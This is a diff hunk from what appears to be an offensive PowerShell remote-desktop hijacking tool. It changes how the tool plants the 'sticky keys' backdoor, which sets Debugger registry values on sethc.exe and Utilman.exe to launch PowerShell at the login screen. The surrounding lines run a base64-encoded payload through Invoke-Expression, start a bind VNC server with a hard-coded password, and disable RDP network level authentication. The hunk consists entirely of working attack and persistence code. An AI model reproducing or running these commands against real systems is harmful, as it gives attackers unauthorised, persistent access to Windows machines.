@@ -560,9 +560,9 @@ function Remove-Exclusions {
     Invoke-Expression $base64string | Out-Null ; Invoke-Vnc -ConType bind -Port 5900 -Password AutoRDPwn }}
         
     if ($sticky){ invoke-command -session $RDP[0] -scriptblock {
-    REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "powershell.exe -noexit ; clear" /f 2>&1> $null
-    REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe" /v Debugger /t REG_SZ /d "powershell.exe -noexit ; clear" /f 2>&1> $null
-    powercfg /setacvalueindex scheme_current sub_video videoconlock 2400 2>&1> $null ; powercfg /setdcvalueindex scheme_current sub_video videoconlock 2400 2>&1> $null }}
+    New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -Name Debugger -Value "powershell.exe -noexit ; clear" -PropertyType REG_SZ  -Force 2>&1> $null
+    New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe" -Name Debugger -Value "powershell.exe -noexit ; clear" -PropertyType REG_SZ  -Force 2>&1> $null
+    New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp" -Name LogonTimeout -Value e10 -PropertyType DWORD -Force 2>&1> $null }}
 
         if($version -Like '*Server*') { Write-Host "$version $txt37" -ForegroundColor Red ; if(!$sticky) { invoke-command -session $RDP[0] -scriptblock { $Host.UI.RawUI.ForegroundColor = 'Green'
         (Get-WmiObject -class Win32_TSGeneralSetting -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0) 2>&1> $null
